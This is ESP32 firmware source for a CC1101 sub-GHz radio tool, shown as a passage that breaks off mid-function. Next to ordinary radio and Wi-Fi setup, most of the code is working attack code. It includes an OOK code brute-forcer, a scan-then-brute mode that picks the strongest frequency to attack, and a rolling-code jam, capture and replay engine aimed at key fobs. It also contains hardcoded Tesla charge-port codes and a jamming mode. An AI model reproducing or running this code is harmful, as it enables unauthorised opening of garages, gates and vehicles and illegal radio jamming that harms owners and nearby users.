// ═══════════════════════════════════════════════════════════════
// CC1101 SETTINGS (mit EEPROM-Persistenz)
// ═══════════════════════════════════════════════════════════════
float current_freq = 433.92;
int current_modulation = 2;  // 0=2FSK 1=GFSK 2=ASK/OOK 3=4FSK 4=MSK
float current_deviation = 47.60;
int current_channel = 0;
float current_datarate = 9.6;
int current_power = 10;
int current_syncmode = 2;
int current_syncword_high = 211;
int current_syncword_low = 145;
int current_adrchk = 0;
int current_addr = 0;
int current_whitedata = 0;
int current_pktformat = 0;
int current_lengthconfig = 1;
int current_packetlength = 0;
int current_crc = 1;
int current_crc_af = 0;
int current_dcfilteroff = 0;
int current_manchester = 0;
int current_fec = 0;
int current_pre = 0;
int current_pqt = 0;
int current_appendstatus = 0;
float current_rxbw = 812.50;
float current_chsp = 199.95;

// ═══════════════════════════════════════════════════════════════
// SIGNAL & STATS
// ═══════════════════════════════════════════════════════════════
int lastRSSI = -100;
int noiseFloor = -95;
int peakRSSI = -120;
float peakFreq = 433.92;

struct SystemStats {
  uint32_t totalTX;
  uint32_t totalRX;
  uint32_t totalFrames;
  uint32_t bruteAttempts;
  uint32_t sessionStart;
  int rssiHistory[STATS_HISTORY];
  int rssiHistoryIdx;
  float freqHistory[STATS_HISTORY];
  int freqHistoryIdx;
} stats;

// ═══════════════════════════════════════════════════════════════
// SPECTRUM DATA
// ═══════════════════════════════════════════════════════════════
struct SpectrumData {
  float startFreq;
  float stopFreq;
  int points[MAX_SPECTRUM_POINTS];
  int count;
  bool valid;
} spectrumData;

// ═══════════════════════════════════════════════════════════════
// FRAME STORAGE
// ═══════════════════════════════════════════════════════════════
struct Frame {
  uint8_t data[64];
  uint8_t length;
  uint32_t timestamp;
  float frequency;
  int8_t rssi;
  char protocol[20];
  uint32_t decodedCode;
  uint8_t decodedBits;
  uint8_t confidence;
  bool valid;
  char note[32];
};

Frame frames[MAX_FRAMES];
int frameCount = 0;

// ═══════════════════════════════════════════════════════════════
// RECEIVED DATA
// ═══════════════════════════════════════════════════════════════
String lastReceivedData = "";
String lastReceivedHex = "";
int lastReceivedLen = 0;
unsigned long systemStartTime = 0;

// ═══════════════════════════════════════════════════════════════
// BRUTE FORCE STATE
// ═══════════════════════════════════════════════════════════════
struct BruteForceState {
  bool running;
  bool paused;
  uint32_t currentCode;
  uint32_t startCode;
  uint32_t endCode;
  uint32_t totalCodes;
  uint8_t protocolIndex;
  ProtocolConfig protocol;
  uint8_t bitCount;
  uint8_t repeatPerCode;
  uint16_t interCodeDelay;
  uint8_t chunkSize;
  bool autoStop;
  uint32_t successCode;
  unsigned long codesPerSecond;
  uint32_t lastCodeCount;
  unsigned long speedUpdateTime;
  unsigned long startTime;
  bool isSmartBrute;
  uint32_t baseCode;
  int frameIndex;
  uint32_t totalSent;
} bruteState;

// ═══════════════════════════════════════════════════════════════
// SCAN THEN BRUTE STATE
// ═══════════════════════════════════════════════════════════════
enum STBPhase {
  STB_IDLE = 0,
  STB_SCANNING = 1,
  STB_SCAN_COMPLETE = 2,
  STB_BRUTE_STARTING = 3,
  STB_BRUTE_RUNNING = 4,
  STB_COMPLETE = 5
};

struct ScanThenBruteState {
  bool active;
  bool paused;
  STBPhase phase;
  float scanStart;
  float scanStop;
  float scanCurrent;
  float scanStep;
  float scanBestFreq;
  int scanBestRSSI;
  int scanTotalSteps;
  int scanCurrentStep;
  uint8_t bruteProtocol;
  uint8_t bruteBits;
  uint8_t bruteRepeat;
  uint16_t bruteDelay;
  unsigned long lastStepTime;
  unsigned long phaseStartTime;
  float topFreqs[5];
  int topRSSI[5];
  int topCount;
} stbState;

// ═══════════════════════════════════════════════════════════════
// ROLLING CODE STATE
// ═══════════════════════════════════════════════════════════════
struct CapturedRollingCode {
  byte data[64];
  uint8_t length;
  int8_t rssi;
  uint32_t timestamp;
  char protocol[20];
  uint32_t counter;
  bool valid;
  bool replayed;
};

struct RollingCodeState {
  bool active;
  bool jamming;
  float frequency;
  uint8_t maxCaptures;
  uint8_t captureCount;
  CapturedRollingCode codes[MAX_ROLLING_CODES];
  uint32_t jamDuration;
  uint32_t rxWindow;
  unsigned long lastSwitch;
  unsigned long attackStartTime;
  uint32_t totalJamTime;
  uint32_t totalRxTime;
  bool replayMode;
} rollingState;

// ═══════════════════════════════════════════════════════════════
// TESLA CODES
// ═══════════════════════════════════════════════════════════════
const byte TESLA_CODE[] = { 0x02, 0xAA, 0xAA, 0xAA };
const int TESLA_CODE_LENGTH = 4;

const byte TESLA_CODE_MODEL3[] = { 0x02, 0xAA, 0xAA, 0xAA, 0x55, 0x55 };
const int TESLA_CODE3_LENGTH = 6;

// ═══════════════════════════════════════════════════════════════
// OTA STATE
// ═══════════════════════════════════════════════════════════════
struct OTAState {
  bool active;
  uint32_t totalSize;
  uint32_t written;
  uint8_t progress;
  bool success;
  String error;
} otaState;

// ═══════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════
void hextoascii(byte *ascii_ptr, byte *hex_ptr, int len) {
  byte i, j;
  for (i = 0; i < (len / 2); i++) {
    j = hex_ptr[i * 2];
    if ((j > 47) && (j < 58)) ascii_ptr[i] = (j - 48) * 16;
    if ((j > 64) && (j < 71)) ascii_ptr[i] = (j - 55) * 16;
    if ((j > 96) && (j < 103)) ascii_ptr[i] = (j - 87) * 16;
    j = hex_ptr[i * 2 + 1];
    if ((j > 47) && (j < 58)) ascii_ptr[i] += (j - 48);
    if ((j > 64) && (j < 71)) ascii_ptr[i] += (j - 55);
    if ((j > 96) && (j < 103)) ascii_ptr[i] += (j - 87);
  }
  ascii_ptr[i] = '\0';
}

void asciitohex(byte *ascii_ptr, byte *hex_ptr, int len) {
  byte i, j, k;
  for (i = 0; i < len; i++) {
    j = ascii_ptr[i] / 16;
    k = (j > 9) ? (j - 10 + 65) : (j + 48);
    hex_ptr[2 * i] = k;
    j = ascii_ptr[i] % 16;
    k = (j > 9) ? (j - 10 + 65) : (j + 48);
    hex_ptr[(2 * i) + 1] = k;
  }
  hex_ptr[2 * i] = '\0';
}

String byteToHexString(byte *buf, int len) {
  String result = "";
  for (int i = 0; i < len; i++) {
    if (buf[i] < 16) result += "0";
    result += String(buf[i], HEX);
    if (i < len - 1) result += " ";
  }
  result.toUpperCase();
  return result;
}

String byteToHexStringNoSpace(byte *buf, int len) {
  String result = "";
  for (int i = 0; i < len; i++) {
    if (buf[i] < 16) result += "0";
    result += String(buf[i], HEX);
  }
  result.toUpperCase();
  return result;
}

String formatUptime(unsigned long seconds) {
  char buf[32];
  sprintf(buf, "%02d:%02d:%02d",
          (int)(seconds / 3600),
          (int)((seconds % 3600) / 60),
          (int)(seconds % 60));
  return String(buf);
}

String getModulationName(int mod) {
  switch (mod) {
    case 0: return "2-FSK";
    case 1: return "GFSK";
    case 2: return "ASK/OOK";
    case 3: return "4-FSK";
    case 4: return "MSK";
    default: return "UNK";
  }
}

String getModeName(SystemMode m) {
  switch (m) {
    case MODE_IDLE: return "IDLE";
    case MODE_RX: return "RX";
    case MODE_REC: return "REC";
    case MODE_JAM: return "JAM";
    case MODE_RAW_RX: return "RAW-RX";
    case MODE_RAW_REC: return "RAW-REC";
    case MODE_BRUTE: return "BRUTE";
    case MODE_SCAN: return "SCAN";
    case MODE_SPECTRUM: return "SPECTRUM";
    case MODE_ROLLING_JAM: return "ROLLING";
    case MODE_STB_SCAN: return "STB-SCAN";
    case MODE_STB_BRUTE: return "STB-BRUTE";
    case MODE_OTA: return "OTA";
    default: return "IDLE";
  }
}

void updateRSSIHistory(int rssi) {
  stats.rssiHistory[stats.rssiHistoryIdx % STATS_HISTORY] = rssi;
  stats.rssiHistoryIdx++;
  if (rssi > peakRSSI) {
    peakRSSI = rssi;
    peakFreq = current_freq;
  }
}

// ═══════════════════════════════════════════════════════════════
// EEPROM / PREFERENCES - CC1101 CONFIG SAVE/LOAD
// ═══════════════════════════════════════════════════════════════
void saveCC1101Config() {
  preferences.begin("cc1101cfg", false);
  preferences.putFloat("freq", current_freq);
  preferences.putInt("mod", current_modulation);
  preferences.putFloat("dev", current_deviation);
  preferences.putInt("ch", current_channel);
  preferences.putFloat("drate", current_datarate);
  preferences.putInt("power", current_power);
  preferences.putInt("syncmode", current_syncmode);
  preferences.putInt("synch", current_syncword_high);
  preferences.putInt("syncl", current_syncword_low);
  preferences.putInt("adrchk", current_adrchk);
  preferences.putInt("addr", current_addr);
  preferences.putInt("white", current_whitedata);
  preferences.putInt("pktfmt", current_pktformat);
  preferences.putInt("lencfg", current_lengthconfig);
  preferences.putInt("pktlen", current_packetlength);
  preferences.putInt("crc", current_crc);
  preferences.putInt("crcaf", current_crc_af);
  preferences.putInt("dcfilt", current_dcfilteroff);
  preferences.putInt("manch", current_manchester);
  preferences.putInt("fec", current_fec);
  preferences.putInt("pre", current_pre);
  preferences.putInt("pqt", current_pqt);
  preferences.putInt("appst", current_appendstatus);
  preferences.putFloat("rxbw", current_rxbw);
  preferences.putFloat("chsp", current_chsp);
  preferences.end();
  Serial.println("OK CC1101 Config gespeichert");
}

void loadCC1101Config() {
  preferences.begin("cc1101cfg", true);
  bool hasSaved = preferences.getBool("saved", false);
  if (!hasSaved) {
    preferences.end();
    Serial.println("i  Keine CC1101 Config");
    return;
  }
  current_freq = preferences.getFloat("freq", 433.92);
  current_modulation = preferences.getInt("mod", 2);
  current_deviation = preferences.getFloat("dev", 47.60);
  current_channel = preferences.getInt("ch", 0);
  current_datarate = preferences.getFloat("drate", 9.6);
  current_power = preferences.getInt("power", 10);
  current_syncmode = preferences.getInt("syncmode", 2);
  current_syncword_high = preferences.getInt("synch", 211);
  current_syncword_low = preferences.getInt("syncl", 145);
  current_adrchk = preferences.getInt("adrchk", 0);
  current_addr = preferences.getInt("addr", 0);
  current_whitedata = preferences.getInt("white", 0);
  current_pktformat = preferences.getInt("pktfmt", 0);
  current_lengthconfig = preferences.getInt("lencfg", 1);
  current_packetlength = preferences.getInt("pktlen", 0);
  current_crc = preferences.getInt("crc", 1);
  current_crc_af = preferences.getInt("crcaf", 0);
  current_dcfilteroff = preferences.getInt("dcfilt", 0);
  current_manchester = preferences.getInt("manch", 0);
  current_fec = preferences.getInt("fec", 0);
  current_pre = preferences.getInt("pre", 0);
  current_pqt = preferences.getInt("pqt", 0);
  current_appendstatus = preferences.getInt("appst", 0);
  current_rxbw = preferences.getFloat("rxbw", 812.50);
  current_chsp = preferences.getFloat("chsp", 199.95);
  preferences.end();
  Serial.println("OK CC1101 Config geladen: " + String(current_freq, 2) + " MHz");
}
// ═══════════════════════════════════════════════════════════════
// CC1101 INITIALIZE
// ═══════════════════════════════════════════════════════════════
void cc1101initialize() {
  ELECHOUSE_cc1101.setSpiPin(sck, miso, mosi, ss);
  ELECHOUSE_cc1101.setGDO(gdo0, gdo2);
  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setGDO0(gdo0);
  ELECHOUSE_cc1101.setCCMode(1);
  ELECHOUSE_cc1101.setModulation(current_modulation);
  ELECHOUSE_cc1101.setMHZ(current_freq);
  ELECHOUSE_cc1101.setDeviation(current_deviation);
  ELECHOUSE_cc1101.setChannel(current_channel);
  ELECHOUSE_cc1101.setChsp(current_chsp);
  ELECHOUSE_cc1101.setRxBW(current_rxbw);
  ELECHOUSE_cc1101.setDRate(current_datarate);
  ELECHOUSE_cc1101.setPA(current_power);
  ELECHOUSE_cc1101.setSyncMode(current_syncmode);
  ELECHOUSE_cc1101.setSyncWord(current_syncword_high, current_syncword_low);
  ELECHOUSE_cc1101.setAdrChk(current_adrchk);
  ELECHOUSE_cc1101.setAddr(current_addr);
  ELECHOUSE_cc1101.setWhiteData(current_whitedata);
  ELECHOUSE_cc1101.setPktFormat(current_pktformat);
  ELECHOUSE_cc1101.setLengthConfig(current_lengthconfig);
  ELECHOUSE_cc1101.setPacketLength(current_packetlength);
  ELECHOUSE_cc1101.setCrc(current_crc);
  ELECHOUSE_cc1101.setCRC_AF(current_crc_af);
  ELECHOUSE_cc1101.setDcFilterOff(current_dcfilteroff);
  ELECHOUSE_cc1101.setManchester(current_manchester);
  ELECHOUSE_cc1101.setFEC(current_fec);
  ELECHOUSE_cc1101.setPRE(current_pre);
  ELECHOUSE_cc1101.setPQT(current_pqt);
  ELECHOUSE_cc1101.setAppendStatus(current_appendstatus);
}

// ═══════════════════════════════════════════════════════════════
// WIFI CONFIG
// ═══════════════════════════════════════════════════════════════
void saveWifiConfig(String ssid, String pass, bool isAP) {
  preferences.begin("wificfg", false);
  preferences.putBool("configured", true);
  preferences.putString("ssid", ssid);
  preferences.putString("pass", pass);
  preferences.putBool("isAP", isAP);
  preferences.end();
  Serial.println("OK WiFi gespeichert: " + ssid);
}

void loadWifiConfig(String &ssid, String &pass, bool &isAP) {
  preferences.begin("wificfg", true);
  bool configured = preferences.getBool("configured", false);
  ssid = preferences.getString("ssid", "");
  pass = preferences.getString("pass", "");
  isAP = preferences.getBool("isAP", true);
  preferences.end();
  Serial.println("Load WiFi: configured=" + String(configured) + " isAP=" + String(isAP) + " SSID=" + ssid);
  if (!configured) isAP = true;
}

void setupWiFi() {
  String savedSSID, savedPass;
  bool isAP;
  loadWifiConfig(savedSSID, savedPass, isAP);
  if (!isAP && savedSSID.length() > 0) {
    Serial.println("WiFi Verbinde STA: " + savedSSID);
    WiFi.disconnect(true);
    delay(100);
    WiFi.mode(WIFI_STA);
    WiFi.begin(savedSSID.c_str(), savedPass.c_str());
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 40) {
      delay(500);
      Serial.print(".");
      attempts++;
    }
    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("\nOK WiFi OK: " + savedSSID);
      Serial.println("IP: " + WiFi.localIP().toString());
      connectedSSID = savedSSID;
      wifiMode = "Client";
      return;
    }
    Serial.println("\n!  STA fehlgeschlagen -> AP");
  }
  WiFi.disconnect(true);
  delay(100);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASSWORD);
  Serial.println("RF AP: " + String(AP_SSID));
  Serial.println("IP: " + WiFi.softAPIP().toString());
  connectedSSID = AP_SSID;
  wifiMode = "AP";
}

// ═══════════════════════════════════════════════════════════════
// BRUTE FORCE ENGINE
// ═══════════════════════════════════════════════════════════════
void sendOOKPulse(uint16_t highUs, uint16_t lowUs) {
  digitalWrite(gdo0, HIGH);
  delayMicroseconds(highUs);
  digitalWrite(gdo0, LOW);
  delayMicroseconds(lowUs);
}

void sendBitOOK(bool bit, const ProtocolConfig &p) {
  if (bit) sendOOKPulse(p.pulseLong, p.pulseShort);
  else sendOOKPulse(p.pulseShort, p.pulseLong);
}

void sendSyncOOK(const ProtocolConfig &p) {
  if (p.preambleCount > 0) {
    for (int i = 0; i < p.preambleCount; i++)
      sendOOKPulse(p.preambleHigh, p.preambleLow);
  }
  sendOOKPulse(p.syncHigh, p.syncLow);
}

void sendCodeOOK(uint32_t code, uint8_t bits, const ProtocolConfig &p) {
  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setPktFormat(3);
  ELECHOUSE_cc1101.SetTx();
  pinMode(gdo0, OUTPUT);
  for (int i = bits - 1; i >= 0; i--)
    sendBitOOK((code >> i) & 1, p);
  sendOOKPulse(p.pulseShort, p.syncLow);
  ELECHOUSE_cc1101.setCCMode(1);
  ELECHOUSE_cc1101.setPktFormat(0);
  ELECHOUSE_cc1101.setSidle();
}






void bruteFromCapturedFrame(int frameIdx, uint32_t range) {
  if (frameIdx < 0 || frameIdx >= frameCount) return;
  Frame &f = frames[frameIdx];
  uint32_t base = f.decodedCode;
  uint32_t start = (base > range) ? base - range : 0;
  uint32_t end = base + range;
  uint8_t proto = 0;
  for (int i = 0; i < PROTOCOL_COUNT; i++) {
    if (strcmp(f.protocol, PROTOCOLS[i].name) == 0) {
      proto = i;
      break;
    }
  }
  bruteState.baseCode = base;
  bruteState.frameIndex = frameIdx;
  initBruteForce(proto, f.decodedBits ? f.decodedBits : 24,
                 start, end, 5, 100, 10, true);
  Serial.printf("[SMART-BRUTE] Frame%d Code=0x%X +/-%u\n", frameIdx, base, range);
}

// ═══════════════════════════════════════════════════════════════
// SCAN THEN BRUTE ENGINE
// ═══════════════════════════════════════════════════════════════
void initScanThenBrute(float scanStart, float scanStop, uint8_t bruteProto,
                       uint8_t bruteBits, uint8_t bruteRepeat, uint16_t bruteDelay) {
  stopScanThenBrute();
  stbState.active = true;
  stbState.paused = false;
  stbState.phase = STB_SCANNING;
  stbState.scanStart = scanStart;
  stbState.scanStop = scanStop;
  stbState.scanCurrent = scanStart;
  stbState.scanStep = 0.02f;
  stbState.scanBestFreq = scanStart;
  stbState.scanBestRSSI = -120;
  stbState.scanTotalSteps = (int)((scanStop - scanStart) / 0.02f) + 1;
  stbState.scanCurrentStep = 0;
  stbState.bruteProtocol = bruteProto;
  stbState.bruteBits = bruteBits;
  stbState.bruteRepeat = bruteRepeat;
  stbState.bruteDelay = bruteDelay;
  stbState.topCount = 0;
  stbState.phaseStartTime = millis();
  for (int i = 0; i < 5; i++) {
    stbState.topFreqs[i] = 0;
    stbState.topRSSI[i] = -120;
  }
  currentMode = MODE_STB_SCAN;
  ELECHOUSE_cc1101.setMHZ(scanStart);
  Serial.printf("[STB] Start: %.2f-%.2f MHz Proto=%d Bits=%d\n",
                scanStart, scanStop, bruteProto, bruteBits);
}




// ═══════════════════════════════════════════════════════════════
// ROLLING CODE ENGINE
// ═══════════════════════════════════════════════════════════════
void initRollingCodeAttack(float freq, uint8_t maxCodes,
                           uint32_t jamDuration, uint32_t rxWindow) {
  stopRollingCodeAttack();
  rollingState.active = true;
  rollingState.jamming = true;
  rollingState.frequency = freq;
  rollingState.maxCaptures = maxCodes;
  rollingState.captureCount = 0;
  rollingState.jamDuration = jamDuration;
  rollingState.rxWindow = rxWindow;
  rollingState.lastSwitch = millis();
  rollingState.attackStartTime = millis();
  rollingState.totalJamTime = 0;
  rollingState.totalRxTime = 0;
  rollingState.replayMode = false;
  memset(rollingState.codes, 0, sizeof(rollingState.codes));
  current_freq = freq;
  ELECHOUSE_cc1101.setMHZ(freq);
  // Jamming starten
  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setPktFormat(3);
  ELECHOUSE_cc1101.SetTx();
  pinMode(gdo0, OUTPUT);
  digitalWrite(gdo0, HIGH);
  currentMode = MODE_ROLLING_JAM;
  Serial.printf("[ROLLING] Start: %.2f MHz max=%d jam=%ums rx=%ums\n",
                freq, maxCodes, jamDuration, rxWindow);
}



void replayRollingCode(uint8_t idx) {
  if (idx >= rollingState.captureCount) return;
  CapturedRollingCode &c = rollingState.codes[idx];
  if (!c.valid) return;
  ELECHOUSE_cc1101.setMHZ(rollingState.frequency);
  for (int i = 0; i < 5; i++) {
    ELECHOUSE_cc1101.SendData(c.data, c.length);
    stats.totalTX++;
    delay(100);
  }
  c.replayed = true;
  ELECHOUSE_cc1101.SetRx();
  Serial.printf("[ROLLING] Replay Code%d: %dB\n", idx + 1, c.length);
}

// ═══════════════════════════════════════════════════════════════
// FRAME ANALYSE
// ═══════════════════════════════════════════════════════════════

// Einfache Heuristik: ersten 3 Bytes als Code
uint32_t code = 0;

// ═══════════════════════════════════════════════════════════════
// WIFI CONFIG - FIXED (kein Preferences-Konflikt)
// ═══════════════════════════════════════════════════════════════





// ═══════════════════════════════════════════════════════════════
// PROTOCOL PULSE ENGINE
// ═══════════════════════════════════════════════════════════════
void sendPulse(uint16_t high, uint16_t low) {
  digitalWrite(gdo0, HIGH);
  delayMicroseconds(high);
  digitalWrite(gdo0, LOW);
  delayMicroseconds(low);
}

void sendSync(const ProtocolConfig &p) {
  digitalWrite(gdo0, HIGH);
  delayMicroseconds(p.syncHigh);
  digitalWrite(gdo0, LOW);
  delayMicroseconds(p.syncLow);
}

void sendBit(bool bit, const ProtocolConfig &p) {
  if (bit) sendPulse(p.pulseLong, p.pulseShort);
  else sendPulse(p.pulseShort, p.pulseLong);
}

void sendBitManchester(bool bit, const ProtocolConfig &p) {
  uint16_t half = p.pulseShort;
  if (bit) {
    digitalWrite(gdo0, LOW);
    delayMicroseconds(half);
    digitalWrite(gdo0, HIGH);
    delayMicroseconds(half);
  } else {
    digitalWrite(gdo0, HIGH);
    delayMicroseconds(half);
    digitalWrite(gdo0, LOW);
    delayMicroseconds(half);
  }
}

void sendCode(uint32_t code, uint8_t bits, const ProtocolConfig &p) {
  for (int i = 0; i < p.preambleCount; i++)
    sendPulse(p.preambleHigh, p.preambleLow);
  sendSync(p);
  if (p.encoding == 1) {
    for (int i = bits - 1; i >= 0; i--)
      sendBitManchester((code >> i) & 1, p);
  } else {
    for (int i = bits - 1; i >= 0; i--)
      sendBit((code >> i) & 1, p);
  }
  digitalWrite(gdo0, LOW);
}

void sendCodeWithRepeat(uint32_t code, uint8_t bits,
                        const ProtocolConfig &p, uint8_t repeat,
                        uint16_t interDelay = 0) {
  for (int i = 0; i < repeat; i++) {
    sendCode(code, bits, p);
    if (interDelay > 0) delay(interDelay);
    else delayMicroseconds(1000);
  }
  stats.totalTX++;
}

// ═══════════════════════════════════════════════════════════════
// PROTOCOL DETECTOR & DECODER
// ═══════════════════════════════════════════════════════════════
uint8_t detectProtocol(const Frame &f, uint8_t &confidence) {
  confidence = 0;
  if (f.length == 0) {
    confidence = 0;
    return 11;
  }
  if (f.length == 3) {
    confidence = 60;
    return 1;
  }
  if (f.length >= 5 && f.length <= 7) {
    confidence = 65;
    return 0;
  }
  if (f.length == 8) {
    confidence = 70;
    return 8;
  }
  if (f.length == 7 && f.data[0] == 0x02) {
    confidence = 55;
    return 9;
  }
  if (f.length == 4 && f.frequency < 320.0) {
    confidence = 55;
    return 10;
  }
  if (f.length == 6) {
    confidence = 50;
    return 2;
  }
  if (f.length == 2) {
    confidence = 45;
    return 4;
  }
  confidence = 30;
  return 11;
}

uint32_t decodeFrameToCode(const Frame &f, uint8_t &bits) {
  uint32_t code = 0;
  bits = 0;
  int maxBytes = (f.length < 4) ? f.length : 4;
  for (int i = 0; i < maxBytes; i++) {
    code |= ((uint32_t)f.data[i]) << (8 * i);
    bits += 8;
  }
  if (bits > 24 && f.length < 8) bits = 24;
  if (bits > 12 && f.length <= 3) bits = 12;
  return code;
}

void analyzeCapturedFrame(int idx) {
  if (idx < 0 || idx >= frameCount) return;
  Frame &f = frames[idx];
  uint8_t confidence = 0;
  uint8_t protoIdx = detectProtocol(f, confidence);
  strncpy(f.protocol, PROTOCOLS[protoIdx].name, sizeof(f.protocol) - 1);
  f.confidence = confidence;
  f.decodedCode = decodeFrameToCode(f, f.decodedBits);
  Serial.printf("[Analyse] Frame%d: %s (Konf:%d%%) Code:0x%X Bits:%d\n",
                idx, f.protocol, confidence, f.decodedCode, f.decodedBits);
}

// ═══════════════════════════════════════════════════════════════
// BRUTE FORCE ENGINE
// ═══════════════════════════════════════════════════════════════
void initBruteForce(uint8_t protocolIdx, uint8_t bits,
                    uint32_t start, uint32_t end,
                    uint8_t repeat, uint16_t interDelay,
                    uint8_t chunk, bool autoStop) {
  if (bits > 32) bits = 32;
  uint32_t maxCode = (bits < 32) ? ((1UL << bits) - 1) : 0xFFFFFFFF;

  bruteState.running = true;
  bruteState.paused = false;
  bruteState.protocolIndex = protocolIdx;
  bruteState.protocol = PROTOCOLS[protocolIdx];
  bruteState.bitCount = bits;
  bruteState.startCode = start;
  bruteState.currentCode = start;
  bruteState.isSmartBrute = false;
  bruteState.endCode = (end == 0 || end > maxCode) ? maxCode : end;
  bruteState.totalCodes = bruteState.endCode - start + 1;
  bruteState.repeatPerCode = repeat;
  bruteState.interCodeDelay = interDelay;
  bruteState.chunkSize = chunk;
  bruteState.autoStop = autoStop;
  bruteState.successCode = 0;
  bruteState.codesPerSecond = 0;
  bruteState.lastCodeCount = 0;
  bruteState.speedUpdateTime = millis();
  bruteState.startTime = millis();
  bruteState.totalSent = 0;

  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setPktFormat(3);
  ELECHOUSE_cc1101.SetTx();
  pinMode(gdo0, OUTPUT);
  currentMode = MODE_BRUTE;

  Serial.printf("[BRUTE] START: %s %d-bit %u Codes\n",
                PROTOCOLS[protocolIdx].name, bits, bruteState.totalCodes);
}

void processBruteForceChunk() {
  if (!bruteState.running || bruteState.paused) return;

  int codesInChunk = 0;
  unsigned long chunkStart = millis();

  while (codesInChunk < bruteState.chunkSize && bruteState.currentCode <= bruteState.endCode && (millis() - chunkStart < 50)) {

    sendCodeWithRepeat(bruteState.currentCode,
                       bruteState.bitCount,
                       bruteState.protocol,
                       bruteState.repeatPerCode,
                       bruteState.interCodeDelay);

    bruteState.currentCode++;
    bruteState.totalSent++;
    codesInChunk++;
    stats.bruteAttempts++;

    if (codesInChunk % 5 == 0) yield();

    if (bruteState.currentCode > bruteState.endCode) {
      stopBruteForce();
      return;
    }
  }

  if (millis() - bruteState.speedUpdateTime > 1000) {
    bruteState.codesPerSecond = bruteState.currentCode - bruteState.lastCodeCount;
    bruteState.lastCodeCount = bruteState.currentCode;
    bruteState.speedUpdateTime = millis();
  }
}

// ============================================================
// BRUTE FORCE STOP / PAUSE / RESUME
// ============================================================
void stopBruteForce() {
  if (!bruteState.running) return;
  bruteState.running = false;
  bruteState.paused = false;
  if (currentMode == MODE_BRUTE || currentMode == MODE_STB_BRUTE) {
    currentMode = MODE_IDLE;
    digitalWrite(gdo0, LOW);
    ELECHOUSE_cc1101.setCCMode(1);
    ELECHOUSE_cc1101.setPktFormat(0);
    ELECHOUSE_cc1101.setSidle();
  }
  Serial.println("BRUTE STOP");
}

void pauseBruteForce() {
  bruteState.paused = true;
  Serial.println("BRUTE PAUSE");
}

void resumeBruteForce() {
  bruteState.paused = false;
  Serial.println("BRUTE RESUME");
}

// ============================================================
// SCAN THEN BRUTE ENGINE
// ============================================================
void stopScanThenBrute() {
  if (!stbState.active) return;
  stbState.active = false;
  stbState.paused = false;
  stbState.phase = STB_IDLE;
  stopBruteForce();
  if (currentMode == MODE_STB_SCAN || currentMode == MODE_STB_BRUTE) {
    currentMode = MODE_IDLE;
    ELECHOUSE_cc1101.setSidle();
  }
  Serial.println("STB STOP");
}

void pauseScanThenBrute() {
  stbState.paused = true;
  if (bruteState.running) pauseBruteForce();
  Serial.println("STB PAUSE");
}

void resumeScanThenBrute() {
  stbState.paused = false;
  if (bruteState.running) resumeBruteForce();
  Serial.println("STB RESUME");
}

void processScanThenBrute() {
  if (!stbState.active || stbState.paused) return;

  switch (stbState.phase) {

    case STB_SCANNING:
      {
        ELECHOUSE_cc1101.setMHZ(stbState.scanCurrent);
        delayMicroseconds(500);
        int rssi = ELECHOUSE_cc1101.getRssi();
        lastRSSI = rssi;

        if (rssi > stbState.scanBestRSSI) {
          stbState.scanBestRSSI = rssi;
          stbState.scanBestFreq = stbState.scanCurrent;
        }
        // Top-5 pflegen
        if (stbState.topCount < 5 || rssi > stbState.topRSSI[stbState.topCount - 1]) {
          int pos = (stbState.topCount < 5) ? stbState.topCount++ : 4;
          stbState.topFreqs[pos] = stbState.scanCurrent;
          stbState.topRSSI[pos] = rssi;
          for (int i = pos; i > 0 && stbState.topRSSI[i] > stbState.topRSSI[i - 1]; i--) {
            float tf = stbState.topFreqs[i];
            stbState.topFreqs[i] = stbState.topFreqs[i - 1];
            stbState.topFreqs[i - 1] = tf;
            int tr = stbState.topRSSI[i];
            stbState.topRSSI[i] = stbState.topRSSI[i - 1];
            stbState.topRSSI[i - 1] = tr;
          }
        }
        stbState.scanCurrentStep++;
        stbState.scanCurrent += stbState.scanStep;

        if (stbState.scanCurrent > stbState.scanStop) {
          stbState.phase = STB_SCAN_COMPLETE;
          stbState.phaseStartTime = millis();
          Serial.printf("STB Scan fertig. Best: %.2f MHz RSSI:%d\n",
                        stbState.scanBestFreq, stbState.scanBestRSSI);
        }
        break;
      }

    case STB_SCAN_COMPLETE:
      stbState.phase = STB_BRUTE_STARTING;
      [[fallthrough]];  // fall-through

    case STB_BRUTE_STARTING:
      {
        current_freq = stbState.scanBestFreq;
        ELECHOUSE_cc1101.setMHZ(current_freq);
        uint32_t maxCode = (stbState.bruteBits < 32)
                             ? ((1UL << stbState.bruteBits) - 1)
                             : 0xFFFFFFFFUL;
        initBruteForce(stbState.bruteProtocol, stbState.bruteBits,
                       0, maxCode,
                       stbState.bruteRepeat, stbState.bruteDelay,
                       10, true);
        stbState.phase = STB_BRUTE_RUNNING;
        currentMode = MODE_STB_BRUTE;
        Serial.printf("STB Brute Start %.2f MHz\n", current_freq);
        break;
      }

    case STB_BRUTE_RUNNING:
      if (!bruteState.running) {
        stbState.phase = STB_COMPLETE;
        stbState.active = false;
        currentMode = MODE_IDLE;
        Serial.println("STB KOMPLETT");
      }
      break;

    case STB_COMPLETE:
      stbState.active = false;
      currentMode = MODE_IDLE;
      break;

    default: break;
  }
}

// ============================================================
// ROLLING CODE ATTACK ENGINE
// ============================================================
void stopRollingCodeAttack() {
  if (!rollingState.active) return;
  rollingState.active = false;
  rollingState.jamming = false;
  if (currentMode == MODE_ROLLING_JAM) {
    currentMode = MODE_IDLE;
    digitalWrite(gdo0, LOW);
    ELECHOUSE_cc1101.setCCMode(1);
    ELECHOUSE_cc1101.setPktFormat(0);
    ELECHOUSE_cc1101.setSidle();
  }
  Serial.println("ROLLING STOP");
}

void processRollingCodeAttack() {
  if (!rollingState.active) return;

  unsigned long now = millis();
  unsigned long elapsed = now - rollingState.lastSwitch;

  if (rollingState.jamming) {
    // --- JAM-Phase ---
    if (elapsed >= rollingState.jamDuration) {
      rollingState.totalJamTime += elapsed;
      rollingState.jamming = false;
      rollingState.lastSwitch = now;
      digitalWrite(gdo0, LOW);
      ELECHOUSE_cc1101.setCCMode(1);
